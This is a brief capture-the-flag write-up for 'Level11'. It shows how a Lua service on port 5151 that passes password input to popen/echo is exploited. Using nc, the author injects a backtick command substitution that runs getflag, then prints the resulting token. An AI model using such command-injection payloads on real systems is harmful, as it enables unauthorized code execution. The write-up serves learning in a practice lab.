# Level11

First of all, a .lua script can be found in the directory with flag11 rights

```bash
./level11.lua
lua: ./level11.lua:3: address already in use
```

```bash
ps aux | grep flag11
flag11    1840  0.0  0.0   2892   828 ?        S    13:46   0:00 lua /home/user/level11/level11.lua
```

The script appears to already be running

```bash
nc localhost 5151
Password: test
Erf nope..
```

```bash
nc localhost 5151
Password: x > /tmp/test
cat /tmp/test
x
```

The script "popen" method calls echo on the input string with no security
This means we can inject our own code and have it run getflag

```bash
nc localhost 5151
Password: `getflag > /tmp/token`
cat /tmp/token
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```